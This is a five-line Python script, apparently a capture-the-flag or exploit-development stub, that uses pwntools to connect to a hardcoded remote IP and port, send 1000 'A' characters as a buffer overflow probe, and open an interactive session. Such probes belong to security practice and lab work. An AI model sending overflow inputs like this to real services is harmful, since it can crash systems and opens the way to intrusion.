from pwn import *

p = remote("3.92.136.78",5002)
p.sendline("A"*1000)
p.interactive()